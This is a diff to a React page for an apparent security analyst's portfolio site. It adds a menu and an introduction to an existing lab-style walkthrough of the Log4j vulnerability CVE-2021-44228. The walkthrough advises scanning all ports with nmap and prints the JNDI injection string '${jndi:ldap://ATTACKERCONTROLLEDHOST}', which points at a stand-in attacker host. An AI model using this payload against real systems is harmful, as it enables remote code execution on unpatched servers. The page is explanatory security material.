@@ -5,6 +5,10 @@ import Tag from "./components/Tag";
 import Opener from "./components/Opener";
 import Summary from "./components/Summary";
 import MeatPotatoes from "./components/MeatPotatoes";
+import Options from "./components/Options";
+import MenuDefault from "./components/Menu";
+
+
 import Foothold from "./components/Foothold";
 import test from "./images/test.gif";
 import portscan from "./images/portscan.png";
@@ -20,12 +24,15 @@ import prescence from "./images/prescence_inlogs.png";
 function App() {
   return (
     <div className="App">
+    <MenuDefault />
       <Container centered style={{ marginTop: "100px" }}>
         <Grid centered>
           <Grid.Column centered width={10}>
+          <h1> Hi, I'm Katie Jordan. </h1>
+          <h3> I'm a Cyber Security Analyst, Web Developer, Professor, Pastry Chef, Illustrator and Retired Product Designer living in New York City. </h3>
+          <Options />
             <Tag CVEscore="CVE-2021-44228" label="Hot and New" />
             <Opener opener="Log 4 J" problemContent="TLDR: A flaw in Log4j, a Java library for logging error messages in applications, is the most high-profile security vulnerability on the internet right now and comes with a severity score of 10 out of 10. " />
-
             <Summary summary="The application present on this target specifically uses ports that may not be immediately noticed by nmap. For the whole picture perspective, scan all ports via nmap and the -p- flag" />
             <Summary summary="The format of the usual syntax that takes advantage of this looks like so:" />
             <Summary summary="${jndi:ldap://ATTACKERCONTROLLEDHOST} This syntax indicates that the log4j will invoke functionality from JNDI, or the 'Java Naming and Directory Interface.' Ultimately, this can be used to access external resources, or  references, which is what is weaponized in this attack The next question is, where could we enter this syntax?" />
